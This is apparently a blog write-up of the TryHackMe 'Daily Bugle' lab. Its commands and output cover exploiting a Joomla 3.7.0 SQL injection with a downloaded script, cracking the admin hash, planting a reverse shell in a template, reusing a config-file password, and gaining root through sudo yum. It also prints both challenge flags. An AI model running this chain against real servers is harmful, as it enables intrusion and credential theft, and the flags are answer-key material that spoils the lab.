---
title: TryHackMe - Daily Bugle Writeup
description: My writeup on daily bugle box.
categories:
 - tryhackme
tags: tryhackme
---

Hi all, let's pwn this.

Box rate is hard but i dont think it's a hard box, more like medium.

You can find the machine there > [Daily Bugle](https://tryhackme.com/room/dailybugle){:target="_blank"}

Let's start as always with a nmap scan.

```bash
$ ip=10.10.97.144
$ nmap -sC -sV -oN nmap.txt $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-21 17:19 EEST
Nmap scan report for 10.10.97.144 (10.10.97.144)
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB (unauthorized)
```

Let's start the enumeration with port 80, we can see there a joomla site running :

```html
<meta name="generator" content="Joomla! - Open Source Content Management" />
```

Let's run [joomscan](https://github.com/rezasp/joomscan){:target="_blank"} on it.

```bash
$ joomscan -u http://$ip/
..data..
[+] Detecting Joomla Version
[++] Joomla 3.7.0
```

Let's search for exploits on this version.

```bash
$ searchsploit joomla 3.7.0
Joomla! 3.7.0 - 'com_fields' SQL Injection  | php/webapps/42033.txt                                                                                                 
```

Bingo, `sqlmap` way takes lot of time, so i found an alternative [exploit](https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py){:target="_blank"}

Let's run it.

```bash
$ wget -q https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
$ python joomblah.py http://$ip/
 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

Perfect, we have `jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`

Let's crack his hash.

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt password
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
```

Let's login in, joomla's administrator panel by default is there `/administrator`.

Now for reverse shell, we can edit a template & add our shell in.

![](https://i.ibb.co/VHVfqwC/Screenshot-2.png)

![](https://i.ibb.co/2gzvyhR/Screenshot-3.png)

![](https://i.ibb.co/7pWsHYW/Screenshot-4.png)

Add your shell in and press `save` & `template preview`

![](https://i.ibb.co/yXn3XPM/Screenshot-5.png)

And we have shell!

```bash
$ nc -lvp 5555
listening on [any] 5555 ...
sh-4.2$ python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.2$ 
```

Now we can see another user there :

```bash
bash-4.2$ ls -la /home
total 0
drwxr-xr-x.  3 root     root      22 Dec 14 14:02 .
dr-xr-xr-x. 17 root     root     244 Dec 14 15:40 ..
drwx------.  2 jjameson jjameson  99 Dec 15 19:47 jjameson
```

We can pretty easy find his password under `/var/www/html` into `configuration.php` file.

`public $password = 'nv5uz9r3ZEDzVjNu';`

```bash
bash-4.2$ su - jjameson
Password: nv5uz9r3ZEDzVjNu
[jjameson@dailybugle ~]$ 
```

Perfect, now privesc to root is really simple, we just need to check `sudo -l`.

```bash
[jjameson@dailybugle ~]$ sudo -l
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Let's check [GTFOBins](https://gtfobins.github.io/gtfobins/yum/), let's follow what it says.

```bash
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
cat >$TF/x<<EOF
> [main]
[main]
> plugins=1
plugins=1
> pluginpath=$TF
pluginpath=$TF
> pluginconfpath=$TF
pluginconfpath=$TF
> EOF
EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
cat >$TF/y.conf<<EOF
> [main]
[main]
> enabled=1
enabled=1
> EOF
EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
cat >$TF/y.py<<EOF
> import os
import os
> import yum
import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
requires_api_version='2.1'
> def init_hook(conduit):
def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
  os.execl('/bin/sh','/bin/sh')
> EOF
EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami; id
whoami; id
root
uid=0(root) gid=0(root) groups=0(root)
```

Perfect, let's read the flags now.

```bash
sh-4.2# cat /root/root.txt
cat /root/root.txt
eec3d53292b1821868266858d7fa6f79
sh-4.2# cat /home/jjameson/user.txt
cat /home/jjameson/user.txt
27a260fe3cba712cfdedb1c86d80442e
```

Not really hard haha, See you!
